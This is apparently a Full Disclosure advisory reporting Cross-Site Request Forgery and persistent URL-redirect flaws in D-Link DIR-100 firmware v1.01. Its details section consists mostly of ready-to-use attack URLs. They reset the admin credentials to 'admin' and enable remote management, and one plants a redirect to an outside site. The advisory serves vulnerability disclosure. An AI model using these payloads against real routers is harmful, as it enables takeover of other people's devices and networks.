Subject: [FD] New vulnerabilities in D-Link DIR-100

Hello list!

There are Cross-Site Request Forgery and URL Redirector Abuse
vulnerabilities in D-Link DIR-100. This is my second advisory for DIR-100.

-------------------------
Affected products:
-------------------------

Vulnerable is the next model: D-Link DIR-100, Firmware v1.01. All other
versions also must be vulnerable.

----------
Details:
----------

Cross-Site Request Forgery (WASC-09):

Change admin's password:

http://site/Tools/tools_admin.xgi?SET/sys/account/superUserName=admin&SET/sys/account/superUserPassword=admin

Turn on Remote Management:

http://site/Tools/tools_admin.xgi?SET/security/firewall/httpAllow=1&SET/security/firewall/httpRemotePort=80

CSRF attack to change admin's password and turn on Remote Management:

http://site/Tools/tools_admin.xgi?SET/sys/account/superUserName=admin&SET/sys/account/superUserPassword=admin&SET/security/firewall/httpAllow=1&SET/security/firewall/httpRemotePort=80

URL Redirector Abuse (WASC-38):

http://site/Tools/vs.htm?location=http://www.google.com

This is Persisted Redirector attack. After setting of an address in location
parameter it saves and later on it's possible to redirect only by visiting
of the page http://site/Tools/vs.htm.

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/8021/).
